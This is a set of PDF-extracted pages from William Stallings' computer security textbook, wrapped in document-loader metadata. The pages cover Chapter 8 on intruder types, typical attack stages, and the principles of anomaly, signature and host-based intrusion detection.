       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 274, 'page_label': '273'}, page_content='273\\n8.1 Intruders\\nIntruder Behavior\\n8.2 Intrusion Detection\\nBasic Principles\\nThe Base-Rate Fallacy\\nRequirements\\n8.3 Analysis Approaches\\nAnomaly Detection\\nSignature or Heuristic Detection\\n8.4 Host-Based Intrusion Detection\\nData Sources and Sensors\\nAnomaly HIDS\\nSignature or Heuristic HIDS\\nDistributed HIDS\\n8.5 Network-Based Intrusion Detection\\nTypes of Network Sensors\\nNIDS Sensor Deployment\\nIntrusion Detection Techniques\\nLogging of Alerts\\n8.6 Distributed or Hybrid Intrusion Detection\\n8.7 Intrusion Detection Exchange Format\\n8.8 Honeypots\\n8.9 Example System: Snort\\nSnort Architecture\\nSnort Rules\\n8.10 Key Terms, Review Questions, and Problems\\nIntrusion Detection\\nCHAPTER \\n \\nM08_STAL0611_04_GE_C08.indd   273 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 275, 'page_label': '274'}, page_content='274  CHAPTER 8 / InTRusIon DETECTIon\\nA significant security problem for networked systems is hostile, or at least \\nunwanted, trespass by users or software. User trespass can take the form of unau -\\nthorized logon or other access to a machine or, in the case of an authorized user, \\nacquisition of  privileges or performance of actions beyond those that have been  \\nauthorized.  Software tr espass includes a range of malware variants as we discuss \\nin Chapter 6.\\nThis chapter covers the subject of intrusions. First, we examine the nature \\nof\\xa0intruders and how they attack, then look at strategies for detecting intrusions.\\n 8.1 INTRUDERS\\nOne of the key threats to security is the use of some form of hacking by an intruder, \\noften referred to as a hacker or cracker. Verizon [VERI16] indicates that 92% of \\nthe breaches they investigated were by outsiders, with 14% by insiders, and with \\nsome breaches involving both outsiders and insiders. They also noted that insid -\\ners were responsible for a small number of very large dataset compromises. Both \\nSymantec [SYMA16] and Verizon [VERI16] also comment that not only is there a \\ngeneral increase in malicious hacking activity, but also an increase in attacks specifi-\\ncally  targeted at individuals in organizations and the IT systems they use. This trend \\nemphasizes the need to use defense-in-depth strategies, since such targeted attacks \\nmay be designed to bypass perimeter defenses such as firewalls and network-based \\nIntrusion detection systems (IDSs).\\nAs with any defense strategy, an understanding of possible motivations of the \\nattackers can assist in designing a suitable defensive strategy. Again, both  Symantec \\n[SYMA16] and Verizon [VERI16] comment on the following broad classes of \\nintruders:\\n• Cyber criminals: Are either individuals or members of an organized crime group \\nwith a goal of financial reward. To achieve this, their activities may include \\nidentity theft, theft of financial credentials, corporate espionage, data theft, or \\ndata ransoming. Typically, they are young, often Eastern European, Russian, or \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Distinguish among various types of intruder behavior patterns.\\n ◆ Understand the basic principles of and requirements for intrusion detection.\\n ◆ Discuss the key features of host-based intrusion detection.\\n ◆ Explain the concept of distributed host-based intrusion detection.\\n ◆ Discuss the key features of network-based intrusion detection.\\n ◆ Define the intrustion detection exchange format.\\n ◆ Explain the purpose of honeypots.\\n ◆ Present an overview of Snort.\\nM08_STAL0611_04_GE_C08.indd   274 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 276, 'page_label': '275'}, page_content='8.1 / InTRuDERs  275\\nsoutheast Asian hackers, who do business on the Web [ANTE06]. They meet \\nin underground forums with names such as DarkMarket.org and theftservices.\\ncom to trade tips and data and coordinate attacks. For some years, reports such \\nas [SYMA16] have quoted very large and increasing costs resulting from cyber-\\ncrime activities, and hence the need to take steps to mitigate this threat.\\n• Activists: Are either individuals working as insiders, or members of a larger \\ngroup of outsider attackers, who are motivated by social or political causes. \\nThey are also known as hacktivists, and their skill level may be quite low. The \\naim of their attacks is often to promote and publicize their cause, typically \\nthrough website defacement, denial of service attacks, or the theft and distri -\\nbution of data that results in negative publicity or compromise of their targets. \\nWell-known recent examples include the activities of the groups Anonymous \\nand LulzSec, and the actions of Chelsea (born Bradley) Manning and Edward \\nSnowden.\\n• State-sponsored organizations:  Are groups of hackers sponsored by govern -\\nments to conduct espionage or sabotage activities. They are also known as \\nAdvanced Persistent Threats (APTs), due to the covert nature and persistence \\nover extended periods involved with many attacks in this class. Recent reports \\nsuch as [MAND13], and information revealed by Edward Snowden, indicate \\nthe widespread nature and scope of these activities by a wide range of countries \\nfrom China and Russia to the USA, UK, and their intelligence allies.\\n• Others: Are hackers with motivations other than those listed above, including \\nclassic hackers or crackers who are motivated by technical challenge or by peer-\\ngroup esteem and reputation. Many of those responsible for discovering new \\ncategories of buffer overflow vulnerabilities [MEER10] could be regarded as \\nmembers of this class. In addition, given the wide availability of attack toolkits, \\nthere is a pool of “hobby hackers” using them to explore system and network \\nsecurity, who could potentially become recruits for the above classes.\\nAcross these classes of intruders, there is also a range of skill levels seen. These \\ncan be broadly classified as:\\n• Apprentice: Hackers with minimal technical skill who primarily use existing \\nattack toolkits. They likely comprise the largest number of attackers, including \\nmany criminal and activist attackers. Given their use of existing known tools, \\nthese attackers are the easiest to defend against. They are also known as “script-\\nkiddies” due to their use of existing scripts (tools).\\n• Journeyman: Hackers with sufficient technical skills to modify and extend \\nattack toolkits to use newly discovered, or purchased, vulnerabilities; or to focus \\non different target groups. They may also be able to locate new vulnerabilities \\nto exploit that are similar to some already known. A number of hackers with \\nsuch skills are likely found in all intruder classes listed above, adapting tools \\nfor use by others. The changes in attack tools make identifying and defending \\nagainst such attacks harder.\\n• Master: Hackers with high-level technical skills capable of discovering brand \\nnew categories of vulnerabilities, or writing new powerful attack toolkits. Some \\nof the better-known classical hackers are of this level, as clearly are some of \\nM08_STAL0611_04_GE_C08.indd   275 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 277, 'page_label': '276'}, page_content='276  CHAPTER 8 / InTRusIon DETECTIon\\nthose employed by some state-sponsored organizations, as the designation APT \\nsuggests. This makes defending against these attackers of the highest difficulty.\\nIntruder attacks range from the benign to the serious. At the benign end of the \\nscale, there are people who simply wish to explore the Internet and see what is out \\nthere. At the serious end are individuals or groups that attempt to read privileged \\ndata, perform unauthorized modifications to data, or disrupt systems.\\nNIST SP 800-61 ( Computer Security Incident Handling Guide , August 2012) \\nlists the following examples of intrusion:\\n• Performing a remote root compromise of an e-mail server\\n• Defacing a Web server\\n• Guessing and cracking passwords\\n• Copying a database containing credit card numbers\\n• Viewing sensitive data, including payroll records and medical information, with-\\nout authorization\\n• Running a packet sniffer on a workstation to capture usernames and passwords\\n• Using a permission error on an anonymous FTP server to distribute pirated \\nsoftware and music files\\n• Dialing into an unsecured modem and gaining internal network access\\n• Posing as an executive , calling the help desk, resetting the executive’s e-mail \\npassword, and learning the new password\\n• Using an unattended, logged-in workstation without permission\\nIntrusion detection systems (IDSs) and intrusion prevention systems (IPSs), \\nof the type described in this chapter and Chapter 9 respectively, are designed to aid \\ncountering these types of threats. They can be reasonably effective against known, \\nless sophisticated attacks, such as those by activist groups or large-scale e-mail scams. \\nThey are likely less effective against the more sophisticated, targeted attacks by some \\ncriminal or state-sponsored intruders, since these attackers are more likely to use new, \\nzero-day exploits, and to better obscure their activities on the targeted system. Hence \\nthey need to be part of a defense-in-depth strategy that may also include encryption \\nof sensitive information, detailed audit trails, strong authentication and authoriza -\\ntion controls, and active management of operating system and application security.\\nIntruder Behavior\\nThe techniques and behavior patterns of intruders are constantly shifting to exploit \\nnewly discovered weaknesses and to evade detection and countermeasures. However, \\nintruders typically use steps from a common attack methodology. [VERI16] in their \\n“Wrap up” section illustrate a typical sequence of actions, starting with a phishing attack \\nthat results in the installation of malware that steals login credentials that eventually \\nresult in the compromise of a Point-of-Sale terminal. They note that while this is one spe-\\ncific incident scenario, the components are commonly seen in many attacks. [MCCL12] \\ndiscuss in detail a wider range of activities associated with the following steps:\\n• Target Acquisition and Information Gathering:  Where the attacker identifies \\nand characterizes the target systems using publicly available information, both \\nM08_STAL0611_04_GE_C08.indd   276 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 278, 'page_label': '277'}, page_content='8.1 / InTRuDERs  277\\ntechnical and non technical, and the use of network exploration tools to map \\ntarget resources.\\n• Initial Access: The initial access to a target system, typically by exploiting a \\nremote network vulnerability as we will discuss in Chapters 10 and 11, by guess-\\ning weak authentication credentials used in a remote service as we discussed in \\nChapter 3, or via the installation of malware on the system using some form of \\nsocial engineering or drive-by-download attack as we discussed in Chapter 6.\\n• Privilege Escalation: Actions taken on the system, typically via a local access \\nvulnerability as we will discuss in Chapters 10 and 11, to increase the privileges \\navailable to the attacker to enable their desired goals on the target system.\\n• Information Gathering or System Exploit: Actions by the attacker to access or mod-\\nify information or resources on the system, or to navigate to another target system.\\n• Maintaining Access:  Actions such as the installation of backdoors or other \\nmalicious software as we discussed in Chapter 6, or through the addition of \\ncovert authentication credentials or other configuration changes to the system, \\nto enable continued access by the attacker after the initial attack.\\n• Covering Tracks: Where the attacker disables or edits audit logs such as we will \\ndiscuss in Chapter 18, to remove evidence of attack activity, and uses rootkits \\nand other measures to hide covertly installed files or code as we discussed in \\nChapter 6.\\nTable 8.1 lists examples of activities associated with the above steps.\\n(a) Target Acquisition and Information Gathering\\n• Explore corporate website for information on corporate structure, personnel, key systems, as well as details \\nof specific Web server and OS used.\\n• Gather information on target network using DNS lookup tools such as dig, host, and others; and query \\nWHOIS database.\\n• Map network for accessible services using tools such as NMAP .\\n• Send query e-mail to customer service contact, review response for information on mail client, server, and \\nOS used, and also details of person responding.\\n• Identify potentially vulnerable services, for example, vulnerable Web CMS.\\n(b) Initial Access\\n• Brute force (guess) a user’s Web content management system (CMS) password.\\n• Exploit vulnerability in Web CMS plugin to gain system access.\\n• Send spear-phishing e-mail with link to Web browser exploit to key people.\\n(c) Privilege Escalation\\n• Scan system for applications with local exploit.\\n• Exploit any vulnerable application to gain elevated privileges.\\n• Install sniffers to capture administrator passwords.\\n• Use captured administrator password to access privileged information.\\nTable 8.1 Examples of Intruder Behavior\\n(Continued)\\nM08_STAL0611_04_GE_C08.indd   277 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 279, 'page_label': '278'}, page_content='278  CHAPTER 8 / InTRusIon DETECTIon\\n 8.2 INTRUSION DETECTION\\nThe following terms are relevant to our discussion:\\n(d) Information Gathering or System Exploit\\n• Scan files for desired information.\\n• Transfer large numbers of documents to external repository.\\n• Use guessed or captured passwords to access other servers on network.\\n(e) Maintaining Access\\n• Install remote administration tool or rootkit with backdoor for later access.\\n• Use administrator password to later access network.\\n• Modify or disable anti-virus or IDS programs running on system.\\n(f) Covering Tracks\\n• Use rootkit to hide files installed on system.\\n• Edit logfiles to remove entries generated during the intrusion.\\nTable 8.1 (Continued)\\nsecurity intrusion: Unauthorized act of bypassing the security mechanisms of a \\nsystem.\\nintrusion detection: A hardware or software function that gathers and analyzes \\ninformation from various areas within a computer or a network to identify  possible \\nsecurity intrusions.\\nAn IDS comprises three logical components:\\n• Sensors: Sensors are responsible for collecting data. The input for a sensor may \\nbe any part of a system that could contain evidence of an intrusion. Types of \\ninput to a sensor includes network packets, log files, and system call traces. \\n Sensors collect and forward this information to the analyzer.\\n• Analyzers: Analyzers receive input from one or more sensors or from other ana-\\nlyzers. The analyzer is responsible for determining if an intrusion has occurred. \\nThe output of this component is an indication that an intrusion has occurred. \\nThe output may include evidence supporting the conclusion that an intrusion \\noccurred. The analyzer may provide guidance about what actions to take as a \\nresult of the intrusion. The sensor inputs may also be stored for future analysis \\nand review in a storage or database component.\\nM08_STAL0611_04_GE_C08.indd   278 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 280, 'page_label': '279'}, page_content='8.2 / InTRusIon DETECTIon  279\\n• User interface: The user interface to an IDS enables a user to view output from \\nthe system or contr ol the behavior of the system. In some systems, the user \\ninterface may equate to a manager, director, or console component.\\nAn IDS may use a single sensor and analyzer, such as a classic HIDS on a host \\nor NIDS in a firewall device. More sophisticated IDSs can use multiple sensors, across \\na range of host and network devices, sending information to a centralized analyzer \\nand user interface in a distributed architecture.\\nIDSs are often classified based on the source and type of data analyzed, as:\\n• Host-based IDS (HIDS): Monitors the characteristics of a single host and the \\nevents occurring within that host, such as process identifiers and the system calls \\nthey make, for evidence of suspicious activity.\\n• Network-based IDS (NIDS): Monitors network traffic for particular network \\nsegments or devices and analyzes network, transport, and application protocols \\nto identify suspicious activity.\\n• Distributed or hybrid IDS:  Combines information from a number of sensors, \\noften both host and network-based, in a central analyzer that is able to better \\nidentify and respond to intrusion activity.\\nBasic Principles\\nAuthentication facilities, access control facilities, and firewalls all play a role in coun-\\ntering intrusions. Another line of defense is intrusion detection, and this has been \\nthe focus of much research in recent years. This interest is motivated by a number of \\nconsiderations, including the following:\\n1. If an intrusion is detected quickly enough, the intruder can be identified and \\nejected from the system before any damage is done or any data are compro -\\nmised. Even if the detection is not sufficiently timely to preempt the intruder, \\nthe sooner that the intrusion is detected, the less the amount of damage and \\nthe more quickly that recovery can be achieved.\\n2. An effective IDS can serve as a deterrent, thus acting to prevent intrusions.\\n3. Intrusion detection enables the collection of information about intrusion tech-\\nniques that can be used to strengthen intrusion prevention measures.\\nIntrusion detection is based on the assumption that the behavior of the intruder \\ndiffers from that of a legitimate user in ways that can be quantified. Of course, we \\ncannot expect that there will be a crisp, exact distinction between an attack by an \\nintruder and the normal use of resources by an authorized user. Rather, we must \\nexpect that there will be some overlap.\\nFigure 8.1 suggests, in abstract terms, the nature of the task confronting the \\ndesigner of an IDS. Although the typical behavior of an intruder differs from the typi-\\ncal behavior of an authorized user, there is an overlap in these behaviors. Thus, a loose \\ninterpretation of intruder behavior, which will catch more intruders, will also lead to \\na number of false positives, or false alarms, where authorized users are identified as \\nintruders. On the other hand, an attempt to limit false positives by a tight interpreta-\\ntion of intruder behavior will lead to an increase in false negatives, or intruders not \\nM08_STAL0611_04_GE_C08.indd   279 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 281, 'page_label': '280'}, page_content='280  CHAPTER 8 / InTRusIon DETECTIon\\nidentified as intruders. Thus, there is an element of compromise and art in the practice \\nof intrusion detection. Ideally, you want an IDS to have a high detection rate, that is, \\nthe ratio of detected to total attacks, while minimizing the false alarm rate, the ratio \\nof incorrectly classified to total normal usage [LAZA05].\\nIn an important early study of intrusion [ANDE80], Anderson postulated that \\none could, with reasonable confidence, distinguish between an outside attacker and a \\nlegitimate user. Patterns of legitimate user behavior can be established by observing \\npast history, and significant deviation from such patterns can be detected.  Anderson \\nsuggests the task of detecting an inside attacker (a legitimate user acting in an unau-\\nthorized fashion) is more difficult, in that the distinction between abnormal and \\nnormal behavior may be small. Anderson concluded that such violations would be \\nundetectable solely through the search for anomalous behavior. However, insider \\nbehavior might nevertheless be detectable by intelligent definition of the class of \\nconditions that suggest unauthorized use. These observations, which were made in \\n1980, remain true today.\\nThe Base-Rate Fallacy\\nTo be of practical use, an IDS should detect a substantial percentage of intrusions \\nwhile keeping the false alarm rate at an acceptable level. If only a modest percentage \\nof actual intrusions are detected, the system provides a false sense of security. On \\nthe other hand, if the system frequently triggers an alert when there is no intrusion \\n(a false alarm), then either system managers will begin to ignore the alarms, or much \\ntime will be wasted analyzing the false alarms.\\nUnfortunately, because of the nature of the probabilities involved, it is very dif-\\nficult to meet the standard of high rate of detections with a low rate of false alarms. \\nFigure 8.1 Profiles of Behavior of Intruders and Authorized Users\\nOverlap in observed\\nor expected behavior\\nProf ile of\\nintruder behavior\\nProf ile of\\nauthorized user\\nbehavior\\nMeasurable behavior\\nparameter\\nAverage behavior\\nof intruder\\nAverage behavior\\nof authorized user\\nProbability\\ndensity function\\nM08_STAL0611_04_GE_C08.indd   280 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 282, 'page_label': '281'}, page_content='8.3 / AnALYsIs APPRoACHEs  281\\nIn general, if the actual numbers of intrusions is low compared to the number of \\nlegitimate uses of a system, then the false alarm rate will be high unless the test is \\nextremely discriminating. This is an example of a phenomenon known as the base-\\nrate fallacy. A study of existing IDSs, reported in [AXEL00], indicated that current \\nsystems have not overcome the problem of the base-rate fallacy. See Appendix I for \\na brief background on the mathematics of this problem.\\nRequirements\\n[BALA98] lists the following as desirable for an IDS. It must:\\n• Run continually with minimal human supervision.\\n• Be fault tolerant in the sense that it must be able to recover from system crashes \\nand reinitializations.\\n• Resist subversion. The IDS must be able to monitor itself and detect if it has \\nbeen modified by an attacker.\\n• Impose a minimal overhead on the system where it is running.\\n• Be able to be configured accor ding to the security policies of the system that \\nis being monitored.\\n• Be able to adapt to changes in system and user behavior over time.\\n• Be able to scale to monitor a large number of hosts.\\n• Provide graceful degradation of service in the sense that if some components \\nof the IDS stop working for any reason, the rest of them should be affected as \\nlittle as possible.\\n• Allow dynamic reconfiguration; that is, the ability to reconfigure the IDS with-\\nout having to restart it.\\n 8.3 ANALYSIS APPROACHES\\nIDSs typically use one of the following alternative approaches to analyze sensor data \\nto detect intrusions:\\n1. Anomaly detection : Involves the collection of data relating to the behavior \\nof legitimate users over a period of time. Then, current observed behavior is \\nanalyzed to determine with a high level of confidence whether this behavior is \\nthat of a legitimate user or alternatively that of an intruder.\\n2. Signature or Heuristic detection: Uses a set of known malicious data patterns \\n(signatures) or attack rules (heuristics) that are compared with current behavior \\nto decide if it is that of an intruder. It is also known as misuse detection. This \\napproach can only identify known attacks for which it has patterns or rules.\\nIn essence, anomaly approaches aim to define normal, or expected, behavior, in \\norder to identify malicious or unauthorized behavior. Signature or heuristic-based \\napproaches directly define malicious or unauthorized behavior. They can quickly and \\nefficiently identify known attacks. However, only anomaly detection is able to detect \\nunknown, zero-day attacks, as it starts with known good behavior and identifies \\nM08_STAL0611_04_GE_C08.indd   281 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 283, 'page_label': '282'}, page_content='282  CHAPTER 8 / InTRusIon DETECTIon\\nanomalies to it. Given this advantage, clearly anomaly detection would be the pre -\\nferred approach, were it not for the difficulty in collecting and analyzing the data \\nrequired, and the high level of false alarms, as we will discuss in the following sections.\\nAnomaly Detection\\nThe anomaly detection approach involves first developing a model of legitimate user \\nbehavior by collecting and processing sensor data from the normal operation of the \\nmonitored system in a training phase. This may occur at distinct times, or there may \\nbe a continuous process of monitoring and evolving the model over time. Once this \\nmodel exists, current observed behavior is compared with the model in order to clas-\\nsify it as either legitimate or anomalous activity in a detection phase.\\nA variety of classification approaches are used, which [GARC09] broadly \\n categorized as:\\n• Statistical: Analysis of the observed behavior using univariate, multivariate, or \\ntime-series models of observed metrics.\\n• Knowledge based: Approaches use an expert system that classifies observed \\nbehavior according to a set of rules that model legitimate behavior.\\n• Machine-learning: Approaches automatically determine a suitable classification \\nmodel from the training data using data mining techniques.\\nThey also note two key issues that affect the relative performance of these alterna -\\ntives, being the efficiency and cost of the detection process.\\nThe monitored data is first parameterized into desired standard metrics that \\nwill then be analyzed. This step ensures that data gathered from a variety of possible \\nsources is provided in standard form for analysis.\\nStatistical approaches use the captured sensor data to develop a statistical pro-\\nfile of the observed metrics. The earliest approaches used univariate models, where \\neach metric was treated as an independent random variable. However, this was too \\ncrude to effectively identify intruder behavior. Later, multivariate models consid -\\nered correlations between the metrics, with better levels of discrimination observed. \\n Time-series models use the order and time between observed events to better classify \\nthe behavior. The advantages of these statistical approaches include their\\xa0 relative sim-\\nplicity and low computation cost, and lack of assumptions about behavior expected. \\nTheir disadvantages include the difficulty in selecting suitable metrics to obtain a rea-\\nsonable balance between false positives and false negatives, and that not all behaviors \\ncan be modeled using these approaches.\\nKnowledge-based approaches classify the observed data using a set of rules. \\nThese rules are developed during the training phase, usually manually, to characterize \\nthe observed training data into distinct classes. Formal tools may be used to describe \\nthese rules, such as a finite-state machine or a standard description language. They \\nare then used to classify the observed data in the detection phase. The advantages \\nof knowledge-based approaches include their robustness and flexibility. Their main \\ndisadvantage is the difficulty and time required to develop high-quality knowledge \\nfrom the data, and the need for human experts to assist with this process.\\nMachine-learning approaches use data mining techniques to automatically \\ndevelop a model using the labeled normal training data. This model is then able \\nM08_STAL0611_04_GE_C08.indd   282 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 284, 'page_label': '283'}, page_content='8.3 / AnALYsIs APPRoACHEs  283\\nto classify subsequently observed data as either normal or anomalous. A key dis -\\nadvantage is that this process typically requires significant time and computational \\nresources. Once the model is generated however, subsequent analysis is generally \\nfairly efficient.\\nA variety of machine-learning approaches have been tried, with varying success. \\nThese include:\\n• Bayesian networks: Encode probabilistic relationships among observed metrics.\\n• Markov models:  Develop a model with sets of states, some possibly hidden, \\ninterconnected by transition probabilities.\\n• Neural networks: Simulate human brain operation with neurons and synapse \\nbetween them, that classify observed data.\\n• Fuzzy logic: Uses fuzzy set theory where reasoning is approximate, and can \\naccommodate uncertainty.\\n• Genetic algorithms: Uses techniques inspired by evolutionary biology, including \\ninheritance, mutation, selection and recombination, to develop classification \\nrules.\\n• Clustering and outlier detection: Group the observed data into clusters based \\non some similarity or distance measure, and then identify subsequent data as \\neither belonging to a cluster or as an outlier.\\nThe advantages of the machine-learning approaches include their flexibility, adapt-\\nability, and ability to capture interdependencies between the observed metrics. Their \\ndisadvantages include their dependency on assumptions about accepted behavior for a \\nsystem, their currently unacceptably high false alarm rate, and their high resource cost.\\nA key limitation of anomaly detection approaches used by IDSs, particularly \\nthe machine-learning approaches, is that they are generally only trained with legiti-\\nmate data, unlike many of the other applications surveyed in [CHAN09] where both \\nlegitimate and anomalous training data is used. The lack of anomalous training data, \\nwhich occurs given the desire to detect currently unknown future attacks, limits the \\neffectiveness of some of the techniques listed above.\\nSignature or Heuristic Detection\\nSignature or heuristic techniques detect intrusion by observing events in the system \\nand applying either a set of signature patterns to the data, or a set of rules that char-\\nacterize the data, leading to a decision regarding whether the observed data indicates \\nnormal or anomalous behavior.\\nSignature approaches match a large collection of known patterns of malicious \\ndata against data stored on a system or in transit over a network. The signatures need \\nto be large enough to minimize the false alarm rate, while still detecting a sufficiently \\nlarge fraction of malicious data. This approach is widely used in anti virus products, \\nin network traffic scanning proxies, and in NIDS. The advantages of this approach \\ninclude the relatively low cost in time and resource use, and its wide acceptance. Dis-\\nadvantages include the significant effort required to constantly identify and review \\nnew malware to create signatures able to identify it, and the inability to detect zero-\\nday attacks for which no signatures exist.\\nM08_STAL0611_04_GE_C08.indd   283 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 285, 'page_label': '284'}, page_content='284  CHAPTER 8 / InTRusIon DETECTIon\\nRule-based heuristic identification  involves the use of rules for identifying \\nknown penetrations or penetrations that would exploit known weaknesses. Rules can \\nalso be defined that identify suspicious behavior, even when the behavior is within the \\nbounds of established patterns of usage. Typically, the rules used in these systems are \\nspecific to the machine and operating system. The most fruitful approach to develop-\\ning such rules is to analyze attack tools and scripts collected on the Internet. These \\nrules can be supplemented with rules generated by knowledgeable security person-\\nnel. In this latter case, the normal procedure is to interview system administrators \\nand security analysts to collect a suite of known penetration scenarios and key events \\nthat threaten the security of the target system.\\nThe SNORT system, which we will discuss later in Section 8.9, is an example \\nof a rule-based NIDS. A large collection of rules exists for it to detect a wide variety \\nof network attacks.\\n 8.4 HOST -BASED INTRUSION DETECTION\\nHost-based IDSs (HIDSs) add a specialized layer of security software to vulnerable \\nor sensitive systems; such as database servers and administrative systems. The HIDS \\nmonitors activity on the system in a variety of ways to detect suspicious behavior. In \\nsome cases, an IDS can halt an attack before any damage is done, as we will discuss \\nin Section 9.6, but its main purpose is to detect intrusions, log suspicious events, and \\nsend alerts.\\nThe primary benefit of a HIDS is that it can detect both external and internal \\nintrusions, something that is not possible either with network-based IDSs or firewalls. \\nAs we discussed in the previous section, host-based IDSs can use either anomaly or \\nsignature and heuristic approaches to detect unauthorized behavior on the monitored \\nhost. We now review some common data sources and sensors used in HIDS, continue \\nwith a discussion of how the anomaly, signature and heuristic approaches are used in \\nHIDS, then consider distributed HIDS.\\nData Sources and Sensors\\nAs noted previously, a fundamental component of intrusion detection is the sensor \\nthat collects data. Some record of ongoing activity by users must be provided as input \\nto the analysis component of the IDS. Common data sources include:\\n• System call traces: A record of the sequence of systems calls by processes on \\na system, is widely acknowledged as the preferred data source for HIDS since \\nthe pioneering work of Forrest [CREE13]. While these work well on Unix and \\nLinux systems, they are problematic on Windows systems due to the extensive \\nuse of DLLs that obscure which processes use specific system calls.\\n• Audit (log file) r ecords1: Most modern operating systems include account -\\ning software that collects information on user activity. The advantage of \\nusing this information is that no additional collection software is needed. \\n1Audit records play a more general role in computer security than just intrusion detection. See Chapter\\xa018 \\nfor a full discussion.\\nM08_STAL0611_04_GE_C08.indd   284 10/11/17   2:55 PM'),\n",
